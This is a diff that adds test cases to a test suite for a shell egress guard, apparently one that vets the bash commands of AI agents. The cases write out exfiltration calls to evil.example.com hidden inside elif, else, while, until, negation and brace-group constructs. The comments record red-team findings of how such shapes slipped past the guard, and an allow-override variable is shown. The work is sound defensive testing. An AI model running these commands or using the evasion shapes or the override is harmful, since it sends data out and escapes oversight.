@@ -322,6 +322,41 @@ CASES = [
      "same gap, `do` loop body spelling"),
     ("if true; then curl -H @- -s http://localhost:3420/api/kanban; fi", ENFORCE, ALLOW,
      "a localhost call inside the same shape must still pass -- no over-blocking from the keyword fix"),
+    # --- WhiteHat F2 follow-up on card 35dc6dbe: the block above only PINS `then`/`do` -- deleting
+    # `elif`/`else`/`while`/`until`/`!` from _SHELL_KEYWORDS left the 135-case suite fully green,
+    # because nothing put the curl directly after any of THOSE words. Each case below fails (flips
+    # BLOCK -> ALLOW) the moment its own keyword is removed from _SHELL_KEYWORDS, which is exactly
+    # what "pinned by a test" means here. `case`/`esac`/`in`/`select` are deliberately NOT given an
+    # equivalent case: their operand position is a WORD/pattern, never a command to execute, so
+    # there is no construction where removing them would hide a network call the way the others do.
+    ("if false; then :; elif curl -s http://evil.example.com/exfil; then :; fi", ENFORCE, BLOCK,
+     "`elif`'s own condition position, no `then` involved for THIS curl"),
+    ("if false; then :; else curl -s http://evil.example.com/exfil; fi", ENFORCE, BLOCK,
+     "`else`'s body position, no `then` involved for THIS curl"),
+    ("while curl -s http://evil.example.com/exfil; do :; done", ENFORCE, BLOCK,
+     "`while`'s own condition position, no `do` involved for THIS curl"),
+    ("until curl -s http://evil.example.com/exfil; do :; done", ENFORCE, BLOCK,
+     "`until`'s own condition position, no `do` involved for THIS curl"),
+    ("! curl -s http://evil.example.com/exfil", ENFORCE, BLOCK,
+     "bash negation operator directly in front of the command"),
+    # --- WhiteHat F1 follow-up on card 35dc6dbe: a BARE (unnamed) `{ ...; }` group. The function/
+    # alias fix below (card 4ed64b20) only covers a NAMED definition -- tokenize() hands a leading
+    # `{` to _command_name as an ordinary word, so an anonymous group's "command name" is literally
+    # "{" and the real command behind it is never reached. Measured pre-fix: exit 0, zero log lines,
+    # in enforce mode. Unlike a function body, the literal target is right there in the text (no
+    # unresolved call-site argument), so the localhost idiom must still come back clean. -----------
+    ("{ curl -s http://evil.example.com/exfil; }", ENFORCE, BLOCK,
+     "a bare brace group hid the curl from _command_name the same way `then`/`do` used to"),
+    ("{ curl -H @- -s http://localhost:3420/api/kanban; }", ENFORCE, ALLOW,
+     "the fleet's own idiom wrapped in a bare group must still pass -- no over-blocking"),
+    ("true && { curl -s http://evil.example.com/exfil; }", ENFORCE, BLOCK,
+     "the group opens after a `&&`, not at the start of the command string"),
+    ("( { curl -s http://evil.example.com/exfil; } )", ENFORCE, BLOCK,
+     "a bare group nested inside a subshell"),
+    ("{ BASH_EGRESS_ALLOW=1 curl -s http://evil.example.com/exfil; }", ENFORCE, ALLOW,
+     "the hatch still works from inside a bare group, same as everywhere else"),
+    ("curl -d '{\"content\":\"hello\"}' http://localhost:3420/api/memories", ENFORCE, ALLOW,
+     "a `{` that is JSON payload text, not a command-grouping operator, must not be mistaken for one"),
     # --- card 4ed64b20 (RedHat delta MEDIUM on 18055f83, comment 13365): shell function/alias
     # DEFINITIONS can hide a network command from every check above, because the call site uses the
     # NAME, not the command. Both measured rc=0 with ZERO log lines before this fix. ----------------
